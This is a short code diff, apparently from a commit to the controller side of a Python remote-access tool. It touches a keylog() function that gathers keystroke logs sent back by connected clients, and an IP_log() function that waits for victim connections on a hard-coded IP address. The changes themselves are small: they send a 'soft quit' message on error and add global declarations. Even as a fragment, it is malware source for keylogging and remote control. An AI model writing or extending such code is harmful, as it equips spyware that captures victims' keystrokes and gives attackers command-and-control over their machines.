@@ -61,6 +61,7 @@ def keylog():
 
 				keylog_list.append(str(client_response))
 	except Exception as e:
+		conn.send(str.encode("soft quit"))
 		input("Error: " + str(e))
 		control()
 
@@ -243,6 +244,7 @@ def control():
 
 
 def IP_log():
+	global conn, address, socket_
 	OS()
 	print("Waiting for conection...\n")
 	host = ("206.189.66.223")
